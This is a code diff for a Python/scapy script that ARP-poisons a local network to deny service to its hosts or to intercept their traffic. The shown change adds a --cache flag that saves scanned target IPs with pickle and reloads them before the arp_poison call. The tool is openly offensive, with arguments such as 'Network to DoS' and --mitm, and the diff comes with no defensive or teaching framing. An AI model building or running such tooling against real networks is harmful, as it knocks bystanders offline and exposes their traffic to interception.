@@ -1,4 +1,4 @@
-import argparse, random, socket, sys, time, os
+import argparse, random, socket, sys, time, os, pickle
 try:
     from scapy.all import Ether, srp, conf, ARP, send, get_if_hwaddr
 except ImportError:
@@ -157,6 +157,7 @@ parser.add_argument("-n", "--network", help="Network to DoS")
 parser.add_argument("-g", "--gateway", help="Gateway IP")
 parser.add_argument("-f", "--file", help="List of IPs to exclude from the attack (one per line)")
 parser.add_argument("-m", "--mitm", action="store_true", help="Use MITM instead")
+parser.add_argument("-c", "--cache", action="store_true", help="Used saved IPs")
 args = parser.parse_args()
 
 #Run checks
@@ -173,7 +174,13 @@ try:
         enableForwarding()
     else:
         MAC = randomMac()
-    target_ips = scan(network, interface)
+
+    if args.cache:
+        target_ips = pickle.load(open("targets.pickle", "rb"))
+    else:        
+        target_ips = scan(network, interface)
+        pickle.dump(target_ips, open("targets.pickle", "wb"))
+        
     arp_poison(gateway, target_ips)
 except KeyboardInterrupt:
     print("User interrupt. Exiting...")
